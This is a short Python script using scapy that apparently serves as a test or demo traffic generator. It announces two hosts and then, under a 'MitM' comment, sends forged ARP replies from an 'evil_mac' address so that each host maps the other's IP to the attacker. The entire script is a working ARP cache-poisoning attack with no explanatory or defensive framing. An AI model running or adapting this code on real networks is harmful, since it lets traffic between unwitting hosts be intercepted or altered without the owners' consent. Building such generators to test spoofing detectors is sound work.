from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP
from scapy.all import sendp

if __name__ == '__main__':
    mac1 = "00:00:00:00:00:01"
    mac2 = "00:00:00:00:00:02"
    evil_mac = "00:DE:AD:BE:AF:00"

    # wifi = "Qualcomm QCA9377 802.11ac Wireless Adapter"
    #
    wifi = "Realtek RTL8852AE WiFi 6 802.11ax PCIe Adapter"
    eth = "Realtek Gaming GbE Family Controller"

    ip1 = "10.100.102.101"
    ip2 = "10.100.102.102"

    sendp(Ether(src=mac1) / IP(src=ip1), iface=eth)
    sendp(Ether(src=mac2) / IP(src=ip2), iface=eth)

    # MitM
    sendp(Ether(src=evil_mac, dst=mac1) / ARP(op=2, hwdst=mac1, pdst=ip1, hwsrc=evil_mac, psrc=ip2), iface=wifi)
    sendp(Ether(src=evil_mac, dst=mac2) / ARP(op=2, hwdst=mac2, pdst=ip2, hwsrc=evil_mac, psrc=ip1), iface=wifi)
